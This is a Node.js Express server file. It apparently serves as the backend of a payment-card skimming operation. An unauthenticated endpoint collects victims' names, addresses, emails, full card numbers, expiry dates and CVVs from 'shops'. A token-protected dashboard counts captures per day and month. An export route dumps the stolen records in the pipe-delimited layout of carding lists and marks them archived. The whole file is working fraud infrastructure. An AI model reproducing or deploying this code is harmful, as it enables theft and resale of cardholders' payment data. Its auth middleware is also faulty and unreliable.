const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const jwt = require("jsonwebtoken");

const history = require("connect-history-api-fallback");

const entrySchema = require("./models/entrySchema");
const profileSchema = require("./models/profileSchema");

const sameDay = (d1, d2) => {
  return (
    d1.getFullYear() === d2.getFullYear() &&
    d1.getMonth() === d2.getMonth() &&
    d1.getDate() === d2.getDate()
  );
};
const sameMonth = (d1, d2) => {
  return (
    d1.getFullYear() === d2.getFullYear() && d1.getMonth() === d2.getMonth()
  );
};

require("dotenv").config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

async function verifyJWT(req, res, next) {
  try {
    if (req.body.token === undefined) {
      res.status(401).json({ success: false, message: "unauthorized" });
      next();
    } else {
      let x = await profileSchema.findOne({ token: req.body.token });
      if (x === null) {
        res.status(401).json({ success: false, message: "unauthorized" });
        next();
      } else {
        jwt.verify(
          req.body.accessToken,
          process.env.TOKEN_KEY,
          (err, decoded) => {
            if (err)
              res.status(401).json({ success: false, message: "unauthorized" });
            return next();
          }
        );
      }
    }
  } catch (err) {
    return next(err);
  }
}

app.use((err, req, res, next) => {
  err ? res.status(401).json({ success: false, message: err }) : next();
});

mongoose.connect(process.env.MONGO_URI, () => {
  console.log("DB CONNECTED");
});

const dataGen = (everythingFound) => {
  let amount = 0;
  let forms = 0;
  let redirects = 0;
  let today = 0;
  let ccThisYear = [];
  let allMonthsThisYear = new Set();
  let allDaysThisMonth = new Set();
  let entriesByMonths = [];
  let entriesByDays = [];
  everythingFound.forEach((x) => {
    ccThisYear.push(x.createdAt);
    x.type === "Redirect" ? redirects++ : forms++;
    amount++;
    sameDay(new Date(), new Date(x.createdAt)) ? today++ : 0;
    sameMonth(new Date(), new Date(x.createdAt))
      ? allDaysThisMonth.add(new Date(x.createdAt).getDate())
      : 0;
    new Date(x.createdAt).getFullYear() == new Date().getFullYear()
      ? allMonthsThisYear.add(new Date(x.createdAt).getMonth())
      : 0;
  });
  allMonthsThisYear.forEach((d) => {
    entriesByMonths.push({
      month: d + 1,
      entries: ccThisYear.filter((m) => new Date(m).getMonth() === d).length,
    });
  });
  allDaysThisMonth.forEach((d) => {
    entriesByDays.push({
      day: d,
      entries: ccThisYear.filter((m) => new Date(m).getDate() === d).length,
    });
  });
  let stats = {
    amount,
    forms,
    redirects,
    today,
    entriesByMonths,
    entriesByDays,
  };
  let v = everythingFound.filter((x) => x.archived === false);
  return { actualData: v, stats };
};

app.get("/huy", (req, res) => {
  res.json({});
});

app.post("/list", verifyJWT, async (req, res, next) => {
  try {
    const everythingFound = await entrySchema.find({});
    res.status(201).json(dataGen(everythingFound));
  } catch (error) {}
});

app.post("/create", async (req, res) => {
  const reg = new entrySchema({
    shop: req.body.shop,
    type: req.body.type,
    name: req.body.name,
    country: req.body.country,
    city: req.body.city,
    state: req.body.state,
    zip: req.body.zip,
    address: req.body.address,
    phone: req.body.phone,
    email: req.body.email,
    cardNumber: req.body.cardNumber,
    cardExpiry: req.body.cardExpiry,
    cardCVV: req.body.cardCVV,
  });
  try {
    const savedEntry = await reg.save();
    res.status(201).json(savedEntry);
  } catch (error) {
    res.status(501).json(error);
  }
});

app.post("/sign", async (req, res, next) => {
  try {
    let u = await profileSchema.findOne({ token: req.body.token });
    u === null || u === "null"
      ? res.status(401).json()
      : (() => {
          const accessToken = jwt.sign(
            { profile_id: u._id, profileToken: u.token },
            process.env.TOKEN_KEY,
            {
              expiresIn: "2h",
            }
          );
          res.status(201).json({ token: u.token, accessToken });
        })();
  } catch (err) {
    next(err);
  }
});

// app.post("/createToken", async (req, res) => {
//   const reg = new profileSchema({
//     token: req.body.token,
//   });
//   try {
//     const savedEntry = await reg.save();
//     res.status(201).json(savedEntry);
//   } catch (error) {
//     res.status(501).json(error);
//   }
// });

async function asyncForEach(array, callback) {
  for (let index = 0; index < array.length; index++) {
    await callback(array[index], index, array);
  }
}

app.post("/dl", verifyJWT, async (req, res) => {
  let startDate = new Date(req.body.start);
  let endDate = new Date(req.body.end);
  let sArray = [];
  try {
    const everythingFound = await entrySchema.find({ archived: false });
    const fArray = everythingFound.filter((x) => {
      return (
        new Date(x.createdAt) >= startDate && new Date(x.createdAt) <= endDate
      );
    });
    await asyncForEach(fArray, async (z) => {
      try {
        await entrySchema.findOneAndUpdate({ _id: z._id }, { archived: true });
        sArray.push(
          `${z.cardNumber || ""}|${z.cardExpiry.split("/")[0]}|${
            z.cardExpiry.split("/")[1]
          }|${z.cardCVV || ""}|${z.name || ""}|${z.address || ""}|${
            z.city || ""
          }|${z.state || ""}|${z.zip || ""}|${z.country || ""}|${z.email || ""}`
        );
      } catch (error) {}
    });
    res.status(200).json({ data: sArray.join("\n") });
  } catch (error) {}
});

app.get("/", (_, res) => {
  res.status(200).sendFile(__dirname + "/dist/index.html");
});

app.use(history());
app.use(express.static(__dirname + "/dist/"));

app.listen(process.env.PORT || 3000, () => {
  console.log(`STARTED AT ${process.env.PORT || 3000}`);
});
